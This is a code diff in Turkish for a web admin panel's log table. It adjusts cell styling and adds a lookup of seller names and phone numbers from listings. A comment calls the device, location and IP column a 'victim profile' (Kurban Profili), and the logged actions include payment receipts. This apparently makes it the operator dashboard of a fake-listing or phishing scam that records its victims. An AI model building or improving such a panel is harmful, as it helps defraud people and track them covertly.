@@ -1174,7 +1174,7 @@
             th, td { 
                 padding: 10px; 
                 font-size: 13px; 
-                white-space: nowrap; 
+                /* white-space: nowrap; (Bu kural detay hücresinde ezildi) */
             } 
 
             .form-grid { 
@@ -2021,7 +2021,7 @@
             });
         };
 
-        // 🔥 LOG TABLOSU TAŞMA SORUNU ÇÖZÜMÜ 🔥
+        // 🔥 YENİDEN DÜZENLENMİŞ ZENGİN LOG FONKSİYONU 🔥
         async function loadLogs(gizli = false) {
             const tbody = document.getElementById('loglarTableBody'); 
             if (!gizli) tbody.innerHTML = getSkeletonRows(5);
@@ -2052,16 +2052,23 @@
                     if(actLow.includes("dekont") || actLow.includes("başarılı")) badgeClass = "badge-success"; 
                     if(actLow.includes("hata") || actLow.includes("yanlış") || actLow.includes("başarısız")) badgeClass = "badge-danger"; 
                     
+                    // Telefon ve İsim bilgisini bulmak için İlanları tarıyoruz
+                    let currentAd = globalIlanlar.find(ilan => ilan.urunAdi === data.ilanBasligi);
+                    let finalSaticiAdi = data.saticiAdi || (currentAd ? currentAd.saticiAdi : null);
+                    let finalSaticiTel = data.saticiTel || (currentAd ? currentAd.saticiTel : null);
+
+                    // Zengin İlan Bilgisi Kartı
                     let ilanHtml = `<div style="display:flex; flex-direction:column; gap:4px; overflow:hidden; text-overflow:ellipsis;">
                         <strong style="font-size:13px; color:var(--text-main); white-space:nowrap; overflow:hidden; text-overflow:ellipsis;" title="${dezenfekteEt(data.ilanBasligi || 'Bilinmiyor')}">${dezenfekteEt(data.ilanBasligi || 'Bilinmiyor')}</strong>`;
-                    if (data.saticiAdi) {
-                        ilanHtml += `<span style="font-size:11px; color:var(--text-muted); display:flex; align-items:center; gap:4px; white-space:nowrap; overflow:hidden; text-overflow:ellipsis;"><svg style="flex-shrink:0;" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg> ${dezenfekteEt(data.saticiAdi)}</span>`;
+                    if (finalSaticiAdi) {
+                        ilanHtml += `<span style="font-size:11px; color:var(--text-muted); display:flex; align-items:center; gap:4px; white-space:nowrap; overflow:hidden; text-overflow:ellipsis;"><svg style="flex-shrink:0;" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg> ${dezenfekteEt(finalSaticiAdi)}</span>`;
                     }
-                    if (data.saticiTel) {
-                        ilanHtml += `<span style="font-size:11px; color:var(--text-muted); display:flex; align-items:center; gap:4px; white-space:nowrap; overflow:hidden; text-overflow:ellipsis;"><svg style="flex-shrink:0;" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path></svg> ${dezenfekteEt(data.saticiTel)}</span>`;
+                    if (finalSaticiTel) {
+                        ilanHtml += `<span style="font-size:11px; color:var(--text-muted); display:flex; align-items:center; gap:4px; white-space:nowrap; overflow:hidden; text-overflow:ellipsis;"><svg style="flex-shrink:0;" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path></svg> ${dezenfekteEt(finalSaticiTel)}</span>`;
                     }
                     ilanHtml += `</div>`;
 
+                    // Kurban Profili (Cihaz/Konum/IP)
                     let cihazText = data.cihaz || data.os || "Cihaz Tespiti Bekleniyor";
                     let lokasyonText = data.lokasyon || "Lokasyon Çözümleniyor";
                     let ipHtml = `<div style="display:flex; flex-direction:column; gap:6px; overflow:hidden;">
@@ -2075,13 +2082,14 @@
                         <td><b style="color:var(--text-main);">${dezenfekteEt(data.tarih)}</b><br><small style="color:var(--text-muted); font-weight:600;">${dezenfekteEt(data.saat)}</small></td>
                         <td>${ilanHtml}</td>
                         <td><span class="log-badge ${badgeClass}">${dezenfekteEt(data.aksiyon)}</span></td>
-                        <td style="word-break: break-word; overflow-wrap: anywhere; line-height:1.4;">${dezenfekteEt(data.detay || '-')}</td>
-                        <td>${ipHtml}</td>
+                        <td style="white-space: normal !important; word-break: break-word; overflow-wrap: anywhere; line-height:1.4; min-width: 150px;">${dezenfekteEt(data.detay || '-')}</td>
+                        <td style="min-width: 140px;">${ipHtml}</td>
                     </tr>`;
                 });
                 
                 tbody.innerHTML = yeniHtml;
                 
+                // Aktif filtreyi uygula
                 const activeFilterBtn = document.querySelector('.log-filter-btn.active');
                 if(activeFilterBtn) {
                     let type = 'all';
@@ -2153,7 +2161,9 @@
         document.getElementById("closeModalBtn").addEventListener('click', function() { modal.style.display = "none"; }); 
 
         const ticketReadModal = document.getElementById('ticketReadModal');
-        document.getElementById('closeTicketReadModal').onclick = function() { ticketReadModal.style.display = 'none'; };
+        document.getElementById('closeTicketReadModal').onclick = function() {
+            ticketReadModal.style.display = 'none';
+        };
 
         window.addEventListener('click', function(e) { 
             if (e.target == modal) modal.style.display = "none"; 
